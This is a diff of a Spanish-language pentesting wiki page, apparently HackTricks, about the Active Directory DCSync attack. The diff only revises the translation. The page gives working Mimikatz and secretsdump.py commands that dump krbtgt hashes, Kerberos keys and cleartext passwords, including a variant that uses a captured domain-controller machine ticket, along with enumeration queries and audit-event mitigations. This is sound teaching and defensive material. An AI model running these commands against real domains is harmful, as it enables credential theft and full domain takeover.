@@ -4,14 +4,14 @@
 
 ## DCSync
 
-El permiso **DCSync** implica tener estos permisos sobre el dominio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>
+El permiso **DCSync** implica tener estos permisos sobre el propio dominio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>
 
 **Notas importantes sobre DCSync:**
 
-- El **ataque DCSync simula el comportamiento de un Domain Controller y solicita a otros Domain Controllers que repliquen información** mediante el Directory Replication Service Remote Protocol (MS-DRSR). Como MS-DRSR es una función válida y necesaria de Active Directory, no se puede desactivar.
+- El **ataque DCSync simula el comportamiento de un controlador de dominio y solicita a otros controladores de dominio que repliquen información** mediante el Directory Replication Service Remote Protocol (MS-DRSR). Como MS-DRSR es una función válida y necesaria de Active Directory, no se puede desactivar ni deshabilitar.
 - De forma predeterminada, solo los grupos **Domain Admins, Enterprise Admins, Administrators y Domain Controllers** tienen los privilegios necesarios.
-- En la práctica, **DCSync completo** requiere **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** en el contexto de nomenclatura del dominio. `DS-Replication-Get-Changes-In-Filtered-Set` suele delegarse junto con ellos, pero por sí solo es más relevante para sincronizar **atributos confidenciales o filtrados para RODC** (por ejemplo, secretos de tipo LAPS heredados) que para volcar por completo krbtgt.<sup>[[2]](#references)</sup>
-- Si las contraseñas de alguna cuenta se almacenan con cifrado reversible, Mimikatz ofrece una opción para mostrar la contraseña en texto claro.
+- En la práctica, **DCSync completo** necesita **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** en el contexto de nomenclatura del dominio. `DS-Replication-Get-Changes-In-Filtered-Set` suele delegarse junto con ellos, pero por sí solo es más relevante para sincronizar **atributos confidenciales o filtrados por RODC** (por ejemplo, secretos de estilo LAPS heredados) que para obtener un volcado completo de krbtgt.<sup>[[2]](#references)</sup>
+- Si las contraseñas de alguna cuenta se almacenan mediante cifrado reversible, Mimikatz ofrece una opción para devolver la contraseña en texto claro.
 
 ### Enumeración
 
@@ -21,7 +21,7 @@ Comprueba quién tiene estos permisos usando `powerview`:
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
 
-Si quieres centrarte en los **principales no predeterminados** con permisos de DCSync, excluye los grupos integrados con capacidad de replicación y revisa solo las entidades de seguridad inesperadas:
+Si quieres centrarte en los **principals no predeterminados** con permisos de DCSync, excluye los grupos integrados con capacidad de replicación y revisa solo las entidades inesperadas:
 
 ```powershell
 $domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
@@ -41,7 +41,7 @@ Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
-### Explotar de forma remota
+### Exploit de forma remota
 
 ```bash
 secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
@@ -53,7 +53,7 @@ secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
 [-history] #To dump password history, may be helpful for offline password cracking
 ```
 
-Ejemplos prácticos acotados:<sup>[[1]](#references)</sup>
+Ejemplos prácticos con alcance definido:<sup>[[1]](#references)</sup>
 
 ```bash
 # Only the krbtgt account
@@ -68,9 +68,9 @@ secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>
 
 ### DCSync usando un TGT de máquina de DC capturado (ccache)
 
-Al revisar un servicio en un controlador de dominio, distingue su identidad de servicio local de su identidad de red. [Microsoft documenta](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) que las cuentas virtuales de SQL Server (`NT SERVICE\...`) acceden a los recursos de red como la cuenta de equipo del host. En un controlador de dominio, esto puede hacer que la cuenta de máquina del DC sea relevante al revisar los derechos de replicación, pero un foothold en un servicio por sí solo no demuestra que exista un TGT de máquina exportable ni una autenticación DCSync utilizable. Verifica la identidad real del servicio, el contexto de autenticación saliente, los tickets o credenciales disponibles y los derechos de replicación efectivos antes de considerar esto una posible vía.
+Al revisar un servicio en un controlador de dominio, distingue su identidad de servicio local de su identidad de red. [Microsoft documenta](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) que las cuentas virtuales de SQL Server (`NT SERVICE\...`) acceden a los recursos de red como la cuenta de equipo del host. En un controlador de dominio, esto puede hacer que la cuenta de máquina del DC sea relevante al revisar los derechos de replicación, pero obtener acceso al servicio por sí solo no demuestra que se pueda exportar un TGT de máquina ni que se disponga de una autenticación DCSync utilizable. Verifica la identidad real del servicio, el contexto de autenticación saliente, los tickets o credenciales disponibles y los derechos de replicación efectivos antes de considerar esto una vía.
 
-En escenarios de modo de exportación con delegación no restringida, es posible capturar un TGT de máquina de un controlador de dominio (p. ej., `DC1$@DOMAIN` para `krbtgt@DOMAIN`). Luego puedes usar ese ccache para autenticarte como el DC y realizar DCSync sin contraseña.<sup>[[5]](#references)</sup>
+En escenarios de export-mode con unconstrained delegation, puedes capturar un TGT de máquina de un controlador de dominio (p. ej., `DC1$@DOMAIN` para `krbtgt@DOMAIN`). Luego puedes usar ese ccache para autenticarte como el DC y realizar DCSync sin contraseña.<sup>[[5]](#references)</sup>
 
 ```bash
 # Generate a krb5.conf for the realm (helper)
@@ -88,15 +88,15 @@ KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
 
 Notas operativas:
 
-- **La ruta Kerberos de Impacket toca SMB primero** antes de la llamada DRSUAPI. Si el entorno aplica la **validación del nombre de destino SPN**, un volcado completo puede fallar con `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
-- En ese caso, solicita primero un ticket de servicio **`cifs/<dc>`** para el DC de destino o usa **`-just-dc-user`** para la cuenta que necesitas de inmediato.
-- Cuando solo tienes permisos de replicación inferiores, la sincronización al estilo LDAP/DirSync aún puede exponer atributos **confidenciales** o **filtrados por RODC** (por ejemplo, el atributo heredado `ms-Mcs-AdmPwd`) sin una replicación completa de krbtgt.<sup>[[2]](#references)</sup>
+- **La ruta Kerberos de Impacket accede primero a SMB** antes de la llamada DRSUAPI. Si el entorno aplica **SPN target name validation**, un volcado completo puede fallar con `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
+- En ese caso, solicita primero un ticket de servicio **`cifs/<dc>`** para el DC de destino o recurre a **`-just-dc-user`** para la cuenta que necesites de inmediato.
+- Cuando solo tienes permisos de replicación inferiores, la sincronización de tipo LDAP/DirSync aún puede exponer atributos **confidenciales** o **filtrados por RODC** (por ejemplo, el atributo heredado `ms-Mcs-AdmPwd`) sin replicar por completo krbtgt.<sup>[[2]](#references)</sup>
 
 `-just-dc` genera 3 archivos:
 
 - uno con los **hashes NTLM**
 - uno con las **claves Kerberos**
-- uno con las contraseñas en texto claro de NTDS para las cuentas que tengan habilitado el [**cifrado reversible**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Puedes obtener los usuarios con cifrado reversible con
+- uno con las contraseñas en texto claro de NTDS para cualquier cuenta que tenga habilitada la [**cifrado reversible**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Puedes obtener los usuarios con cifrado reversible con
 
   ```bash
   Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
@@ -124,16 +124,16 @@ Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveG
 
 ### Mitigación
 
-- ID de evento de seguridad 4662 (debe habilitarse la directiva de auditoría para el objeto): se realizó una operación en un objeto<sup>[[4]](#references)</sup>
-- ID de evento de seguridad 5136 (debe habilitarse la directiva de auditoría para el objeto): se modificó un objeto del servicio de directorio
-- ID de evento de seguridad 4670 (debe habilitarse la directiva de auditoría para el objeto): se cambiaron los permisos de un objeto
-- AD ACL Scanner: crea y compara informes de ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
+- Security Event ID 4662 (Debe estar habilitada la directiva de auditoría del objeto): se realizó una operación en un objeto<sup>[[4]](#references)</sup>
+- Security Event ID 5136 (Debe estar habilitada la directiva de auditoría del objeto): se modificó un objeto del servicio de directorio
+- Security Event ID 4670 (Debe estar habilitada la directiva de auditoría del objeto): se cambiaron los permisos de un objeto
+- AD ACL Scanner: crea y compara informes de ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)
 
 ## References
 
 - [1] [Registro de cambios de Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
-- [2] [DirSync: aprovechamiento de Get-Changes y Get-Changes-In-Filtered-Set de replicación](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
-- [3] [DCSync: volcar hashes de contraseñas del controlador de dominio](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
+- [2] [DirSync: aprovechamiento de Replication Get-Changes y Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
+- [3] [DCSync: volcado de hashes de contraseñas desde el controlador de dominio](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
 - [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
 - [5] [HTB: Delegate — credenciales de SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync para obtener DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
 {{#include ../../banners/hacktricks-training.md}}
